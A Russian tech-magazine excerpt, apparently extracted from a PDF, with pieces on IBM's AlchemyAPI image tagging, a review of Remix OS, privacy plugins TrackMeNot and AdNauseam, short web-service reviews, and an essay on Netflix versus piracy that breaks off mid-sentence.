   Аналогичный сервис AlchemyAPI, разработанный в IBM, функционирует уже
пару лет. Чтобы начать им пользоваться, достаточно зарегистрироваться на
alchemyapi.com и получить ключ разработчика. Программный интерфейс по-
строен в стиле REST: каждой функции соответствует отдельный URL на серве-
ре gateway-a.watsonplatform.net, аргументы передаются HTTP-вызовом, а
результаты приходят в ответ в виде XML или JSON.
   Испытаем удачу с уже проверенными картинками. Для классификации изобра-
жений в AlchemyAPI предусмотрено две функции: URLGetRankedImageKeywords
и ImageGetRankedImageKeywords. Они отличаются лишь тем, каким образом пе-
редается изображение — в виде ссылки или в виде файла по POST. Мы восполь-
зуемся первым вариантом — он проще.





>>> pprint.pprint(call_api(‘http://gateway-a.watsonplatform.net/
    calls/url/URLGetRankedImageKeywords’,
    url=’http://goo.gl/I9ytWA’, apikey=apikey, outputMode=’json’))
{u’imageKeywords’: [{u’score’: u’0.985226’, u’text’: u’animal’},
                    {u’score’: u’0.964429’, u’text’: u’cow’},
                    {u’score’: u’0.598688’, u’text’: u’cattle’},
                    {u’score’: u’0.5’,      u’text’: u’farm’}],
u’status’: u’OK’,}

Корову AlchemyAPI разглядел идеально (процитированная выше выдача немно-
го сокращена). С Путиным детище IBM было менее многословно: оно сообщило
лишь, что на картине люди. Для того чтобы разбираться с людьми, служат дру-
гие функции: URLGetRankedImageFaceTags и ImageGetRankedImageFaceTags.
Попробуем скормить президента им.

>>> pprint.pprint(call_api(‘http://gateway-a.watsonplatform.net/
    calls/url/URLGetRankedImageFaceTags’,
    url=’http://goo.gl/Jh34qd’, apikey=apikey, outputMode=’json’))

Ответ выдается в формате JSON и хорошо структурирован. Сервис IBM не
только нашел на картинке людей и определил их пол и возраст, но и сообразил,
кто это такие: Владимир Путин, по его мнению, — это политик, телевизионный
актер и мастер боевых искусств, а Дмитрий Медведев — политик и президент.
Не поспоришь!
   Бесплатно можно делать до тысячи запросов к AlchemyAPI в сутки. Дальше
придется платить, но тарифы терпимы: до 0,75 цента за одно обращение к сер-
вису. Не такая уж большая плата за то, чтобы не утруждать собственные нейро-
ны. Они, говорят, не восстанавливаются.
PC ZONE
    ВСЕ СВОЕ
 НОШУ С СОБОЙ





      ОБЗОР REMIX OS — ДЕСКТОПНОЙ ОС
             НА ОСНОВЕ ANDROID
Проект Remix OS для ПК — еще одна по-
пытка превратить Android в систему для
обычного персонального компьютера
с клавиатурой, мышью и дисплеем. И эта       Олег Парамонов
                                                                                            paramonov@sheep.ru
цель, пусть и не без изъянов, достигнута.
Вот только зачем?

ПРЕДЫСТОРИЯ
В отличие от большинства других настольных «андроидов», Remix OS — не про-
ект горстки энтузиастов. За системой стоит серьезная американская компания
под названием Jide Technology, которую пару лет назад основали бывшие ин-
женеры Google. Это, впрочем, прошлое. В настоящем у Jide Technology боль-
ше общего с Apple, чем с Google. Если все пойдет по плану, стартап, подобно
Apple, будет зарабатывать на продаже железа. Софт, в том числе и Remix OS
для ПК, лишь средство достижения этой цели.
  Впервые Jide Technology привлекла внимание публики в июле 2015 года.
При помощи Kickstarter компания собрала больше полутора миллионов долла-
ров на производство Remix Mini — компактного настольного компьютера, кото-
рый стоит всего 70 долларов. Дешевизна объясняется тем, что у внутренностей
Remix Mini куда больше общего со смартфоном, чем с традиционным ПК. Вме-
сто процессора с архитектурой x86 в нем стоит маломощный ARM, а операци-
онной системой Remix Mini служит доработанный Android.
Сбор средств увенчался успехом, и сегодня Remix Mini можно заказать в ин-
тернет-магазине. Попутно в модельном ряду Jide Technology появилось еще
одно устройство — планшет Ultratablet с большим дисплеем и чехлом-клавиа-
турой, явно претендующий на уголок в нише, которую сегодня делят iPad Pro
и Microsoft Surface.
   Как  в  эту  картину  вписывается
Remix OS для ПК? Скорее всего, в Jide
Technology считают эту систему своего
рода рекламой. Потенциальные поку-
патели не знают, чего ждать от настоль-
ной версии Android, и это вряд ли хо-
рошо влияет на продажи. Remix OS для
ПК призвана развеять сомнения потен-
циальных покупателей Remix Mini или
Ultratablet. Они могут скачать ее и свои-
ми глазами увидеть, что их ждет.

УСТАНОВКА
Remix OS базируется на проекте
Android-x86, варианте мобильной платформы
Android, приспособленном для запуска на обыкно-
венных персональных компьютерах. Самое важное раз-
личие между Remix OS и Android-x86 заключается в том, что по умолчанию при-
ложения Remix OS не занимают весь экран. Вместо этого они располагаются
в отдельных окнах, которые можно двигать, складывать или масштабировать.
   Создатели системы резонно предполагают, что желающих установить Remix
OS на компьютер вместо Windows не особенно много. Основная форма суще-
ствования этой системы другая — загрузочный USB-накопитель. Образ диска,
который нужно скопировать на флешку, скачивается с сайта компании (есть два
варианта, с EFI и без). Емкость флешки должна составлять не менее восьми ги-
габайт. Кроме того, разработчики настойчиво рекомендуют выбирать накопи-
тели с поддержкой USB 3.0. В противном случае могут возникнуть проблемы.
  В самой установке нет ничего сложного. Пользователям Windows проще
всего. Они могут подготовить загрузочную флешку при помощи прилагающей-
ся к образу диска утилиты. Пользователям других систем пока что следует рас-
считывать только на себя и свое знание командной строки. Когда все готово,
останется лишь перезапустить компьютер и загрузить Remix OS.
   Вначале система предложит сделать выбор между гостевым и резидентным
режимом. Гостевой режим представляет собой аналог Live CD. Система всякий
раз начинает работу с нуля, а после выключения забывает обо всех изменениях
и настройках. В резидентном режиме настройки и установленные приложения
сохраняются на все ту же флешку. Это может быть удобно, когда то и дело при-
ходится использовать чужие компьютеры.
   Если желания возиться с флешками нет, стоит попробовать установить
Remix OS в виртуальную машину. Увы, трудно гарантировать, что из этого что-
то выйдет. У одних система загружается в VirtualBox без малейшей запинки.
У других виртуальная машина соглашается иметь дело лишь с гостевым режи-
мом. У третьих Remix OS бесповоротно виснет на одном из первых шагов, и ни
один рецепт решения проблемы, найденный в интернете, не помогает.

ИНТЕРФЕЙС
Интерфейс Remix OS целиком и полностью составлен из элементов, которые
бесстыдно скопированы из других, более известных и уважаемых операцион-
ных систем. Панель задач и сами окна почти неотличимы от своих аналогов из
Windows 10. Панель уведомлений, окно настроек и масса мелких деталей поза-
имствованы у OS X.





Место меню «Пуск» в левом нижнем углу экрана занимают трудноописуемые за-
корючки, похожие на мутировавший вензель с маковской клавиши Command. Его
суть от этого, впрочем, не изменилась — «Пуск» есть «Пуск». Если кликнуть по
странному значку, из него выпадет список установленных приложений со встро-
енным поиском по названию. Тот же эффект вызывает клавиша Win на клавиатуре.
   Чуть правее находится пара кнопок: одна со стилизованной стрелкой, ука-
зывающей налево, другая с окружностью. Первая вызывает знакомую пользо-
вателям Android и на редкость бессмысленную в многооконной среде Remix
OS команду «Назад». Другая складывает все окна, чтобы пользователь увидел
рабочий стол.
  Дальше начинается зона, отведенная под иконки работающих приложений.
Некоторые из них закреплены на панели задач и остаются на ней, даже если
приложение не работает. Другие добавляются при запуске приложения и про-
падают, когда оно выключается. Если нажать на иконку, на первый план выйдут
окна выбранного приложения. Другими словами, все как обычно.
   У правого края панели задач находится аналог системного трея Windows.
Возле часов собраны миниатюрные иконки, соответствующие различным ком-
понентам компьютера: оперативная память, заряд батареи, статус Bluetooth
и Wi-Fi, раскладка клавиатуры и громкость. Часть иконок по умолчанию скрыта.
   Единственная иконка в трее, которую не узнают пользователи Windows, со-
стоит из трех горизонтальных полосок разной длины. Зато такая иконка пре-
красно знакома пользователям OS X. Она выдвигает панель уведомлений,
скрытую за правым краем дисплея. В панели уведомлений Remix OS отобража-
ются последние принятые системой уведомления, сгруппированные по своим
источникам. Чуть ниже находится ряд кнопок. Первая отключает демонстрацию
уведомлений, другая скрывает панель задач, при помощи третьей можно де-
лать скриншоты, четвертая вызывает окно с системными настройками.
   Окна оформлены в стиле Windows:
едва заметная рамка по краям и гро-
моздкая полоска, увенчивающая окно
сверху. У правого края полоски сосре-
доточены кнопки, позволяющие свер-
нуть, максимизировать или закрыть
окно, а у левого — еще одна андроид-
ная кнопка «Назад». В Windows между
ними находится название открытого
документа или приложения. В Remix
OS это место, как правило, пустует.
   Чтобы изменить размер окна, нуж-
но потянуть за его край с любой сто-
роны. Передвинуть его можно, ухва-
тившись за верхнюю полоску. Если
прижать окно к левому или правому
краю, оно переформатируется так, чтобы занимать ровно половину экрана, —
это еще одна возможность, позаимствованная из Windows.
Кроме максимизации, в Remix OS предусмотрен полноэкранный режим. Что-
бы войти в него, необходимо запустить приложение, а затем нажать правой
кнопкой на его иконку в панели задач и выбрать в появившемся контекстном
меню соответствующую команду. Приложение перезапустится, после чего
полоска сверху исчезнет. Чтобы увидеть ее снова, нужно подвести указатель
мыши к верхнему краю экрана. Панель задач в большинстве случаев остается
на экране, но может и исчезнуть — это зависит от конкретного приложения.
При следующем запуске приложения оно сразу же войдет в полноэкранный
режим.
   Как известно, обычный Android иногда автоматически закрывает неисполь-
зуемые фоновые приложения, чтобы освободить ресурсы для других. В Remix
OS такое поведение отключено, чтобы самовольно закрывающиеся окна не
смущали пользователя. У спокойной жизни, однако, есть цена. Поскольку си-
стема не освобождает ресурсы, они рано или поздно кончатся. Этого лучше
избегать.
  Еще одно номинальное преимущество Remix OS — улучшенная поддержка
аппаратной клавиатуры. Система распознает множество сочетаний клавиш,
известных пользователям других ОС, и даже функциональные клавиши, управ-
ляющие воспроизведением медиафайлов, яркостью дисплея, подсветкой кла-
виатуры и громкостью. Все прекрасно работает до тех пор, пока не возникает
необходимость сменить раскладку. Тут-то и выясняется, что сделать это невоз-
можно. Для переключения с кириллицы на латиницу и обратно придется каждый
раз открывать настройки клавиатуры и долго блуждать в списках доступных язы-
ков. Пока это не исправят, Remix OS не годится даже для написания твитов дли-
ной 140 знаков, не говоря уж о текстах побольше.





Еще одна забавная и в то же время раздражающая деталь связана с тачпадом.
Если и не все, то по крайней мере многие современные ноутбуки оснащены
тачпадом, который распознает несколько прикосновений сразу. Remix OS пол-
ностью поддерживает тачпады с мультитачем, но делает это так своеобразно,
что лучше бы не поддерживала вовсе. Вместо обычного мышиного указателя
в виде стрелки она выводит сразу несколько круглых указателей — по одному
на каждый палец. Практической пользы ноль, зато неудобств — масса.

ПРИЛОЖЕНИЯ
Приложения, которые по умолчанию установлены в Remix OS, можно пере-
считать по пальцам одной руки. В выпадающем из местного аналога кнопки
«Пуск» списке можно найти стандартные браузер и музыкальное приложение
Android, файловый менеджер и видеоплеер MX Player. Кроме того, там име-
ются иконки для вызова простеньких калькулятора, часов и списка контактов,
а также списка закачек, настроек и экрана с виджетами, напоминающего ма-
ковский Dashboard.
  Файловый менеджер заслуживает особого упоминания. Почти все осталь-
ное мы уже видели на своих смартфонах и планшетах. Файловый менеджер
разработчики Remix OS сделали сами. Это, впрочем, не значит, что мы его не
видели. Он поразительно похож на маковский Finder, только малость попро-
ще: ни встроенного поиска, ни разнообразных видов просмотра списков
файлов.





В Remix OS нет приложений Google, в том числе магазина приложений Play Store.
Как водится, в интернете блуждает масса рекомендаций, как исправить этот не-
достаток. Все они по большей части сводятся к совету скачать исполняемый
файл неизвестного происхождения с одного из сомнительных сайтов, запустить
его и молиться, что установка Play Store — это все, что он делает. Дальше все
опять-таки зависит от удачи. Многочисленные жалобы на форумах свидетель-
ствуют о том, что заставить Play Store работать удается далеко не всем.
Неизбежная альтернатива — ручная установка APK, загруженных с пиратских
и полупиратских сайтов. С некоторыми приложениями трюк, увы, не проходит:
они либо не запускаются без объяснения причин, либо запускаются, но не
работают.

                                                                 Все кончено
И даже если приложение запустилось
и работает, оно может запросто ока-
заться бесполезным из-за того, что
его разработчики рассчитывали на
смартфоны и планшеты, но никак не
на Remix OS. Характерный пример —
андроидная версия видеоплеера VLC,
склонная располагать видео в произ-
вольной точке окна.
  Еще один пример этой напасти
легко встретить в играх. Вот, скажем, Minecraft. Для управления движениями
персонажа служит экранная клавиатура в нижнем углу окна. На тачскрине она
попадала бы под левую руку, пока правая управляет обзором. Но в Remix OS
нет правой и левой руки. Есть единственный указатель мыши, и с ним этот ин-
терфейс бесполезен.





Тыкать мышью в курсорные кнопки на экране — упражнение не для слабонервных

Печальный факт заключается в том, что большинство приложений Android со-
вершенно не приспособлены для управления при помощи клавиатуры и мыши.
Remix OS изо всех сил старается притвориться операционной системой для пер-
сонального компьютера, но это иллюзия, причем не особенно убедительная.
   Через пару часов после установки, разглядывая рекламу, мигающую в ка-
ждом втором приложении Android, трудно избежать вопроса: зачем? Зачем на
персональном компьютере Android? Он хуже, чем Windows. Он хуже, чем OS X.
Он хуже любого современного дистрибутива Linux. Разумеется, Remix OS мож-
но доработать, исправить проблемы с раскладкой и тачпадом, добавить Play
Store, сделать систему стабильнее, но зачем? Какую проблему это решит? Кто
станет ее использовать? Ответа нет.
PC ZONE
 КРАСНЫЙ
                   СКРЫВАЕМ
                   СЕТЕВУЮ
                    АКТИВНОСТЬ
                    ОТ ПРОДВИНУТОЙ
                   СЛЕЖКИШУМ
Есть немало способов отследить челове-
ка в Сети. Следы, позволяющие отличить
одного пользователя от другого, оставляет
                                                                                        84ckf1r3практически всё: поисковые запросы, клики
                                                                                            84ckf1r3@gmail.com
по ссылкам, настройки системы. «Баннеро-
резки» помогают уберечься от самой про-
стой слежки, но постепенно начинают появ-
ляться и более хитрые способы замести следы.

ПУБЛИЧНАЯ ПРИВАТНОСТЬ
Поисковая строка для многих пользователей стала куда более привычной, чем
адресная, — недаром в большинстве браузеров их объединили в одну. Поис-
ковикам это на руку: они живут за счет сбора данных, которые мы сами им по-
ставляем, даже не задумываясь об этом всерьез.
   Используя приватный режим или очищая историю браузера, ты удаляешь
только локальные следы. При этом логи со всеми запросами остаются на сер-
вере поисковой системы. Они анализируются в поисках статистических корре-
ляций и наполняют свежими данными теневой профиль пользователя. Учиты-
вается все, что можно вычислить: частота запросов, их тип, количество ошибок,
время анализа поисковой выдачи, переходы по предложенным ссылкам, реак-
ция на контекстную рекламу и многое другое.





Два плагина в дополнение к Adblock Edge

Формально это делается «для повышения качества сервиса» и возможности
давать «персональные рекомендации». Реально — зачастую передается или
продается маркетологам для использования в таргетированной рекламе, а так-
же нередко попадает в руки политтехнологов и правительственных органов,
которые ищут более тонкие методы управления толпой и превентивного обна-
ружения всех, кто представляет потенциальную угрозу.
  Собирая только доступные сведения и даже не предлагая явно заполнять
информацию о себе, Google, Яндекс и другие поисковые системы составляют
детальные профили всех, кто хоть раз пользовался их сервисами. По рейтин-
гу запросов легко оценивать популярность ОС, программ и плагинов, степень
проникновения интернета в разные регионы, узнавать, о чем сейчас думает
большинство и как реагирует на новости. По специфическим запросам и ха-
рактерному поведению можно идентифицировать человека даже в том случае,
если он сменил ОС, браузер, учетную запись и IP-адрес.

РАСТВОРИТЬСЯ В ТОЛПЕ
Большинство инструментов защиты приватности используют методы сокрытия
уникальных ID и настроек пользователя. Однако, пытаясь спрятать одни марке-
ры, они добавляют другие. Технологии сбора статистики все чаще встраивают-
ся в браузерные расширения, а в них самих появляются уникальные идентифи-
каторы — URI (см. «Взлом расширений Chrome: как обойти Adblock»).
   Принципиально другой способ используется в TrackMeNot (TMN) — плаги-
не для Firefox и Chrome, написанном на кафедре информатики в Нью-Йоркском
университете с использованием JavaScript, C++ и XUL. Он работает в фоне
и генерирует фиктивные поисковые запросы, растворяя в них реальные и за-
трудняя сбор информации о пользовательских предпочтениях. Такое запуты-
вание эффективно, поскольку плагин действует исключительно на стороне кли-
ента и не зависит от централизованных серверов.





Пример имитации поиска в TrackMeNot
За десять лет существования программа обзавелась интересными механиз-
мами мимикрии под действия реального пользователя. В последних версиях
набор функций был расширен за счет нескольких оригинальных механизмов:
динамических списков запросов (с основанной на лентах RSS инициализаци-
ей), очереди связанных поисковых фраз и выборочных кликов в поисковой вы-
даче. Кроме того, TMN умеет выполнять запросы в фоне или в отдельной вклад-
ке браузера, имитировать скроллинг результатов и добавлять к ранее введенным
фразам уточняющие слова.





Настройки TMN

Опция burst-mode лучше имитирует поведение человека, поскольку без нее за-
просы отсылаются через регулярные интервалы. Она также помогает избежать
бана со стороны Google (поисковик перенаправляет на страницу для ввода
капчи, если подозревает, что запросы с твоего IP-адреса отсылает бот). Если
редирект происходит даже с burst-mode, просто измени интервал отправки
ложных запросов на более длительный (скажем, десять в час).

                                                            Злоупотребление
                                                TMN ведет к бану IP
                                                              в поисковиках до
                                                            ввода капчи





ЗАФЛУДИТЬ РЕКЛАМНЫЕ СЕТИ
Онлайновая реклама становится более агрессивной и тоже используется для
скрытого профилирования сетевой активности. Ее блокирование решает про-
блему лишь частично и может демаскировать пользователя еще сильнее. По-
этому принцип генератора «белого шума» был повторен в плагине AdNauseam
(лат. «до тошноты») — расширении для Firefox, которое защищает пользова-
теля от отслеживания баннерными сетями и средствами персонализации
рекламных показов.
                                                       AdNauseam
                                                                 требуется Adblock





AdNauseam скрывает настоящие переходы по ссылкам в потоке автоматиче-
ских кликов. Он просто кликает в фоне на все подряд, мешая причислить поль-
зователя к определенной целевой аудитории. Работая совместно с Adblock,
AdNauseam забивает базы данных рекламных сетей ложной статистикой. Про-
филирование пользователей становится бесполезным, а саму рекламу они
обычно не видят вовсе — за редким и настраиваемым исключением. Не все
версии Adblock устраивают программу. После v. 2.6.11 Adblock Plus стал несо-
вместим с ней, а формально подходящий форк Edge был заброшен и на прак-
тике тоже бесполезен. Выход пока только один: установить старую версию
Adblock Plus, которую можно найти на архивной странице.

                                                       AdNauseam
                                                           несовместим
                                                                    с версиями Adblock
                                                                    Plus после 2.6.11





После установки плагин AdNauseam нужно запустить вручную. Он работает
скрыто, но позволяет просматривать логи и статистику своей работы. Фоновые
клики по рекламным ссылкам открываются в «песочнице» — неотображаемой
вкладке браузера. Она создается средствами page-worker API в Mozilla Firefox.
Обнаруженная реклама на текущей вкладке





Лог AdNauseam за несколько минут работы
ОТ ОБМАНА ДО САМООБМАНА
Используемые TrackMeNot и AdNauseam методы запутывания имеют свои не-
гативные стороны. Очевидно, что после их установки возрастает сетевой тра-
фик. Это может быть критично, если пользуешься интернетом через мобильную
сеть. Сам факт использования расширений для обфускации
легко определяется сайтами и рекламными сетями. По умол-
чанию поисковые запросы в TrackMeNot выполняются только
на английском языке. Теоретически можно указать в настрой-
ках русскоязычные RSS как источник ключевых слов, но на
практике это приводит к сообщениям об ошибке плагина или                                   WWW
отсеву только английских терминов. Аналогично AdNauseam
плохо распознает рекламные ссылки русскоязычных ресур-    Список слов, по ко-
                                                                      торым Министерство
сов. Несмотря на «песочницу», фоновое кликание по всем                                                                            национальной без-
ссылкам подряд в AdNauseam повышает риск нарваться на    опасности США вы-
drive-by-угрозы через фишинговые ссылки. Кроме того, авто-    полняет мониторинг
                                                                                 сетевого трафикары расширения наверняка смогут извлечь прибыль из потока
фиктивных кликов, если их плагин обойдет средства проти-        Страничка
водействия накрутке.                                              AdNauseam на GitHub
  Идея обоих аддонов лежит на поверхности и уже неплохо
                                                                             Страница
себя зарекомендовала. Есть шанс увидеть подобные расши-                                                                            TrackMeNot на сайте
рения, адаптированные для использования кириллицы и по-         NYU
пулярных в России рекламных сетей.
PC ZONE





                                                                           Андрей Письменный
                                                                                            apismenny@gmail.com



       SEEDR
            www.seedr.cc

 1





           Seedr — веб-сервис для скачивания торрентов

                           От облачных технологий, судя по всему, никуда не деться, если
        даже скачивание торрентов кто-то умудрился превратить в модный
          веб-сервис. Seedr действительно заметно упрощает дело: закиды-
        ваем в него торрент или магнетлинк, и он принимается скачивать
         с отличной скоростью.
  Не сказать, что «облачный торрент-клиент» — это что-то новое.
То же самое, к примеру, позволял делать сервис StreamNation, но
прекратил: его разработчики предпочли более легальные направ-
ления для развития бизнеса. Есть еще возможность сделать соб-
ственный сидбокс (о чем у нас будет статья в одном из следующих
номеров), но у готового сервиса есть несколько важных достоинств.
   Во-первых, в интерфейс Seedr встроен веб-плеер: как только тор-
рент скачан, можно начинать смотреть. Если формат файла не под-
держивается нативно, то параллельно будет запущена конвертация.
Во-вторых, Seedr кеширует популярные файлы, и если попытаться
скачать какой-то новый фильм, то вместо закачки произойдет копиро-
вание, что гораздо быстрее (можно не сомневаться, что ничего даже
не копируется, — просто в твоей облачной папке появляется ярлык
для файла; однако дисковое пространство все равно вычтут). И конеч-
но же, загруженный файл можно скачать себе на компьютер.
   Для большего удобства у Seedr есть браузерный плагин — пока
только для Chrome. Если установить его и залогиниться в сервис, то
можно кликать правой кнопкой по ссылкам на торренты или магнет-
линкам и выбирать пункт Add to Seedr. А пользователи медиацентров
с Kodi (это новое название XBMC) могут подключить Seedr через API
и видеть содержимое облачного хранилища в своей коллекции.
  В бесплатной версии дисковое пространство ограничено дву-
мя гигабайтами, чего едва хватает на один фильм. За хранилище на
100 Гбайт разработчики просят 10 долларов в месяц, за 250 Гбайт —
15 долларов.
      GUESSTIMATE
          www.getguesstimate.com

2





         Guesstimate — калькулятор неточных величин

                       Неточные вычисления (к примеру, денежные) часто приходится
        повторять дважды — по минимуму и по максимуму. Метод простой,
       но иногда муторный, особенно если входных данных много и по до-
        роге нужно не только складывать их друг с другом, но и производить
        другие операции. А что, если захочется поменять какой-то из пара-
       метров и посмотреть, как изменится результат? Снова все пересчи-
        тывать или исхитриться и написать формулу в каком-нибудь Excel?
       Сервис Guesstimate призван решить эту проблему более элегантно.
           Guesstimate — это специальный калькулятор, который оперирует
       не цифрами, а вероятностными распределениями. Но не волнуйся,
        если ты не учил тервер или учил, но слишком давно, чтобы что-то
        помнить. Эти знания, конечно, не помешают, но в данном случае не
        требуются.
           Все, что нужно — записать в ячейки переменные, задав их значе-
        ния как диапазон (к примеру, [1,100]), а потом в другой ячейке точ-
       но так же, как в Excel, написать формулу, начав со знака равенства.
      В режиме ввода формулы ты увидишь пары букв в зеленых кружках
        около каждой ячейки — это названия переменных, которые ты мо-
       жешь использовать. Связи между ячейками и графики Guesstimate
        нарисует самостоятельно.
            Кстати, ты можешь заметить, что гауссианы выходят неровны-
        ми. Причина в том, что для прикидки используется моделирование
       по методу Монте-Карло: Guesstimate прогоняет 5000 случайных зна-
        чений для каждого диапазона, чтобы получить близкую к реальности
        картину распределения.
           Guesstimate — cервис очень новый и сильно недоделанный. Это
        не мешает производить вычисления, но нужно быть готовым к тому,
        что их увидят другие пользователи. Любая созданная в Guesstimate
       модель сейчас является публичной и отображается в разделе Public
        Models (поэтому он забит файлами с названиями типа Test). Для
        конспирации можешь помечать поля только тебе понятными ярлы-
       ками и удалять модели после окончания подсчетов.



      SSL SERVER TEST И SECURITYHEADERS.IO
            securityheaders.io

3





        SSL Server Test и SecurityHeaders.io — средства выявления небезопасных
         настроек сайта

                        «Вроде работает» — та реплика, которой не должна заканчи-
        ваться процедура настройки сервера. Чтобы удостовериться, что
        на твоем сайте верно сконфигурированы сертификаты и заголовки
        HTTP, можешь воспользоваться этими утилитами. Никто, впрочем,
        не запрещает проверить ими и чужой сайт.
   Разработчик сервиса SecurityHeaders.io рассказывает, что по-
требность в проверке заголовков однажды возникла у него самого.
Решив свою задачу, он подумал, что это неплохая идея для публич-
но доступного сервиса. Пользоваться им просто: указываешь адрес
сайта, жмешь Scan и среди результатов видишь заголовки ответа
сервера, а также краткий анализ того, каких важных для безопас-
ности полей не хватает. К примеру, отсутствие заголовка X-XSS-
Protection будет означать, что сайт не просит браузеры включать
фильтр XSS, а без Strict-Transport-Security (HSTS) повышается ве-
роятность утечки сессий и атак типа MITM.
   Сервис SSL Server Test, разработанный в Qualys SSL Labs, похо-
жим образом проводит проверку сертификатов SSL и выдает под-
робнейший отчет о ключах и поддерживаемых методах шифрования.
Он даже симулирует хендшейки в разных браузерах и операционных
системах.
  Оба сервиса заканчивают свою работу выставлением оценки (от
F до A+). По умолчанию она будет отображаться в таблице рекордов
на главной странице, но до начала сканирования эту опцию можно
и отменить.
СЦЕНА
    NETFLIX
 И НИКАКОГО
 РАССЛАБОНА
   СТРИМИНГ И ПИРАТЫ КОНКУРИРУЮТ
      ЗА ПРАВО УБИТЬ ТЕЛЕВИЗОР:
    КТО ПОБЕДИТ И ЧТО БУДЕТ ДАЛЬШЕ





                                      Андрей Письменный
                                               apismenny@gmail.com
Забавная ситуация: пираты, Голливуд и Кремниевая доли-
на, по сути, сражаются за будущее кинематографа, при-
чем последнее оружие в этой войне — юзабилити. И по-
скольку этот сложный конфликт уже в ближайшие годы
может вступить в фазу решающей битвы, пора разобрать-
ся, что происходит и почему.

У американской молодежи есть такое выражение: Netflix and chill. Буквально
оно означает «Нетфликс и расслабон», но используется в качестве эвфемизма
для секса: заходи, мол, ко мне, кинцо глянем. «Нетфликсу» повезло: подобно
тому, как название Google стало синонимом поиска в интернете, слово Netflix
постепенно начинает означать... нет, не то, о чем ты подумал, а просто «смо-
треть телевизор». Если точнее, то «смотреть кино и сериалы на любом экра-
не»; телевизор теперь — лишь один из них.
    Netflix стал нарицательным не просто так. Число его активных подписчиков
подбирается к 70 миллионам; компания активно скупает права на новые сери-
алы и фильмы, а также снимает их самостоятельно, чтобы предложить зрите-
лям эксклюзивный контент. Тем временем телевидение пользуется все мень-
шим спросом: его популярность среди молодых зрителей (от 12 до 34 лет)
в США за последние пять лет упала примерно на 30%, и когда-то любимый
всеми «ящик» сдает позиции с каждым следующим поколением.
Недавно Netflix стал доступен по всему миру, включая Россию. Но нужен ли он
здесь кому-то, кроме особых любителей, покуда есть масса способов смо-
треть что угодно, не платя ни за какую подписку? И речь, конечно, не об эфир-
ных телеканалах.
   Главное преимущество, которое есть у стриминговых сервисов вроде «Нет-
фликса» и которого нет у традиционной схемы добычи пиратского контента
(торрент-трекер плюс программа для скачивания торрентов), — это легкость,
с которой можно искать и смотреть фильмы. Вторая важная составляющая —
это рекомендации. Тот же Netflix в них очень силен и использует техники big
data, чтобы выдавать наиболее качественные советы.
   Удобный сервис, который рекомендует фильмы, способен составить не-
плохую конкуренцию нынешним способам смотреть кино бесплатно без SMS
(и уж точно — с SMS). Даже если ты прекрасно умеешь находить и скачивать
что угодно, есть шанс, что тебя соблазнит возможность заплатить немного за
комфорт и ценные рекомендации. Правда, выгодной цены Netflix в России не
предлагает — из-за нынешнего печального курса доллара казавшиеся еще
недавно скромными десять баксов превращаются в ощутимые 800 рублей.
Однако это исключительно локальные проблемы. У продавцов контента есть
заботы посерьезнее.

ПИРАТСТВО С КОМФОРТОМ
Может показаться, что стриминговые сервисы и пираты спокойно поделят
между собой ту территорию, которую оставляет телевидение, плавно удаля-
ясь в прошлое. Вовсе не обязательно: как только пираты наверстают разрыв
в удобстве, все преимущества будут на их стороне.
  Первые признаки новой эры пиратства появились в 2008 году. Самым ран-
ним из них можно считать сервис Joost, хоть он и был абсолютно легальным.
Это приложение и пиринговая сеть, разработанные под руководством Никла-
са Зеннстрёма и Януса Фрииса — создателей KaZaA и Skype. Joost работал
по принципу телевидения: у него были каналы, где передачи шли одна за дру-
гой, — это значительно упрощает предзагрузку через децентрализованную
сеть. Подразумевалось, что Joost будет окупаться за счет рекламы, но эти
планы не сбылись, и фирма закрылась в 2012 году. Для нас же важно другое:
Joost показал, что видео в приличном разрешении вполне можно стримить че-
рез пиринговую сеть.
На следующий год после появления Joost похожую функцию реализовали раз-
работчики µTorrent. У пользователей тогдашних бета-версий появилась воз-
можность скачивать видеофайлы и одновременно воспроизводить их в пле-
ере. Чтобы это стало возможным, торрент-клиент отдает предпочтение тем
кусочкам, которые ближе к началу файла и, соответственно, скорее понадо-
бятся при проигрывании. Уже серьезный шаг к победе. Но до мейнстримного
продукта не хватало еще одного компонента — каталога фильмов.
  Настоящим королем пиратского стриминга ненадолго стал Popcorn Time
— первая версия этого приложения вышла в марте 2014 года. Разработчики
«Попкорна» совместили легкость использования Netflix с огромным количе-
ством контента, доступного в торрентах. Куда проще выбрать, что посмотреть,
когда перед тобой обложки новых фильмов, а не поисковая строка The Pirate
Bay. Выбираешь любое кино, жмешь Play и после недолгой буферизации смо-
тришь фильм в отличном качестве. Мечта киномана и кошмар для правообла-
дателей.
Popcorn Time, каким мы его помним. Сходство с Netflix — разительное

Понятно, что долго это продолжаться не могло. И действительно: сначала
судом запугали оригинальных разработчиков, затем (уже после перехода
Popcorn Time к новым мейнтейнерам) группу YIFY, которая поставляла кон-
тент для «Попкорна» (сайт yts.ag, который можно найти сейчас, — это фейк,
созданный самозванцами). Следом рассорилась и разошлась уже вторая по
счету команда разработчиков — и тоже, скорее всего, из-за нависшей угро-
зы судебных разбирательств. Программа не работает уже который месяц, но
окончательная ли это смерть «Попкорна»?
   У Popcorn Time можно было отобрать домен и лишить его поставщиков кон-
тента, но долго ли до появления полностью децентрализованной и при этом
удобной платформы для распространения видео? Ничего невозможного в этой
идее нет: сами фиды с описаниями фильмов и магнетлинками можно переда-
вать по распределенной сети, и подкопаться будет уже значительно сложнее.
Тот же The Pirate Bay раз за разом возвращается в эфир, несмотря на аресты
основателей и регулярные полицейские рейды.
  С приходом по-настоящему непотопляемого аналога «Попкорна» конку-
ренция со стримингом будет идти почти на равных — настолько, насколько на
равных может соревноваться платное с бесплатным. У пиратов, впрочем, есть
и другие преимущества. Сейчас Netflix при всем желании не может показать
любой контент в любой стране — права везде принадлежат разным компани-
ям, и не все из них охотно идут навстречу на переговорах.
  Обойти региональные ограничения «Нетфликса» пока что легко, и за это
никто не будет преследовать, но пользоваться полулегальными (и в том числе
платными) методами ради того, чтобы заплатить за контент, — это не самая
тривиальная идея. Ну и конечно, никто и никогда не сможет конкурировать с
пиратами в деле распространения «утекших» фильмов — тех, что еще не выш-
ли на DVD или даже не добрались до кинотеатров.

ПОСЛЕ БИТВЫ
Победа «Попкорна» вряд ли будет неожиданной: индустрия давно и упорно
рыла себе яму, вкладывая деньги в развитие DRM и в борьбу с пиратством.
Вместо этого можно было попытаться привести правовую базу в соответствие
с современными нуждами и вложиться в разработку действительно полезных
технологий и удобных сервисов. Проникнуться сочувствием к обиженным пра-
вообладателям теперь, мягко говоря, непросто.

                                                         Машинка, которая
                                                             приносит убытки
                                                              киноиндустрии,
                                                             созданная соо-
